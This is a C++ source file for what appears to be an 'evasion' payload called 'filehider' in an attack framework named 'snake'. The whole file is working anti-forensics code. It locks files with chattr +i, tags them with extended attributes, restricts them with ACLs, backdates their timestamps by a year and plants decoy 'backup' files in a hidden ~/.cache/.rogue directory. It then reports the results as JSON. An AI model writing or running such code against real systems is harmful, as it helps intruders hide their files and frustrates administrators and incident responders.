#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>

#include <algorithm>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <functional>
#include <string>
#include <vector>

#include "snake/payloads.hpp"

namespace snake::payloads {
namespace {

using OJ = nlohmann::ordered_json;

struct HiddenFile {
    std::string path;
    std::string method;
};

void walk(const std::string& root, const std::function<void(const std::string&, bool)>& fn) {
    struct stat st;
    if (::lstat(root.c_str(), &st) != 0) return;
    bool is_dir = S_ISDIR(st.st_mode);
    fn(root, is_dir);
    if (!is_dir) return;

    DIR* d = ::opendir(root.c_str());
    if (d == nullptr) return;
    std::vector<std::string> names;
    while (struct dirent* e = ::readdir(d)) {
        std::string n = e->d_name;
        if (n == "." || n == "..") continue;
        names.push_back(n);
    }
    ::closedir(d);
    std::sort(names.begin(), names.end());
    for (const auto& n : names) walk(root + "/" + n, fn);
}

OJ hider_method(const char* name, bool success, const std::string& detail) {
    OJ m = OJ::object();
    m["name"] = name;
    m["success"] = success;
    m["detail"] = detail;
    return m;
}

OJ apply_chattr(const std::string& dir, std::vector<HiddenFile>& files) {
    if (which_exe("chattr").empty()) return hider_method("chattr +i", false, "chattr not found");
    walk(dir, [&](const std::string& path, bool is_dir) {
        if (is_dir) return;
        mut_run_argv({"chattr", "+i", path});
        files.push_back({path, "chattr_immutable"});
    });
    return hider_method("chattr +i", true, "Applied chattr +i to files in " + dir);
}

OJ apply_xattr(const std::string& dir, std::vector<HiddenFile>&) {
    if (which_exe("setfattr").empty())
        return hider_method("extended_attrs", false, "setfattr not found");
    walk(dir, [&](const std::string& path, bool is_dir) {
        if (is_dir) return;
        mut_run_argv({"setfattr", "-n", "user.hidden", "-v", "1", path});
        mut_chtimes(path, std::time(nullptr) - 365 * 24 * 3600);
    });
    return hider_method("extended_attrs", true, "Applied extended attributes");
}

OJ apply_acl(const std::string& dir, std::vector<HiddenFile>&) {
    if (which_exe("setfacl").empty()) return hider_method("ACL", false, "setfacl not found");
    walk(dir, [&](const std::string& path, bool is_dir) {
        if (is_dir) return;
        mut_chmod(path, 0600);
        mut_run_argv({"setfacl", "-m", "u:nobody:---", path});
        mut_run_argv({"setfacl", "-m", "g:nogroup:---", path});
    });
    return hider_method("ACL", true, "Applied ACL restrictions");
}

OJ apply_timestomp(const std::string& dir, std::vector<HiddenFile>&) {
    const std::time_t past = std::time(nullptr) - 365 * 24 * 3600;
    walk(dir, [&](const std::string& path, bool) { mut_chtimes(path, past); });
    return hider_method("timestomp", true, "Timestamps set to 1 year ago");
}

OJ create_decoys(const std::string& dir, std::vector<HiddenFile>& files) {
    static const char* kNames[] = {"system_logs.tar.gz", "kernel_backup.bin",
                                   "config_backup.tar", "tmp_cache.dat"};
    std::string decoy_dir = dir + "/.decoy";
    mut_mkdir_p(decoy_dir, 0755);
    for (const char* name : kNames) {
        std::string path = decoy_dir + "/" + name;
        std::string content =
            "# " + std::string(name) + " backup\n# Generated: " + local_rfc3339() + "\n";
        mut_write(path, content, 0644);
        std::time_t old_time = std::time(nullptr) - (std::time_t)(60 + std::strlen(name)) * 24 * 3600;
        mut_chtimes(path, old_time);
        files.push_back({path, "decoy"});
    }
    return hider_method("decoy_files", true, "Created 4 decoy files");
}

class FileHider : public Payload {
  public:
    const char* name() const override { return "filehider"; }
    const char* category() const override { return "evasion"; }
    const char* description() const override {
        return "Hide files via chattr, extended attributes, ACLs, timestomping";
    }

    Output execute(const Args& args) const override {
        std::string dir;
        auto it = args.find("dir");
        if (it != args.end()) dir = it->second;
        if (dir.empty()) {
            const char* home = getenv("HOME");
            dir = (home == nullptr || *home == '\0') ? ".cache/.rogue"
                                                     : std::string(home) + "/.cache/.rogue";
        }
        mut_mkdir_p(dir, 0700);

        OJ r = OJ::object();
        r["timestamp"] = now_rfc3339();
        r["target_dir"] = dir;

        std::vector<HiddenFile> files;
        OJ methods = OJ::array();
        methods.push_back(apply_chattr(dir, files));
        methods.push_back(apply_xattr(dir, files));
        methods.push_back(apply_acl(dir, files));
        methods.push_back(apply_timestomp(dir, files));
        methods.push_back(create_decoys(dir, files));
        r["methods"] = methods;

        if (files.empty()) {
            r["files"] = nullptr;
        } else {
            OJ fa = OJ::array();
            for (const auto& f : files) {
                OJ o = OJ::object();
                o["path"] = f.path;
                o["method"] = f.method;
                fa.push_back(o);
            }
            r["files"] = fa;
        }

        std::string s = MarshalJSON(r);
        return Output(s.begin(), s.end());
    }
};

FileHider g_filehider;

struct Reg { Reg() { Register(&g_filehider); } };
Reg g_reg;

}  // namespace
}  // namespace snake::payloads
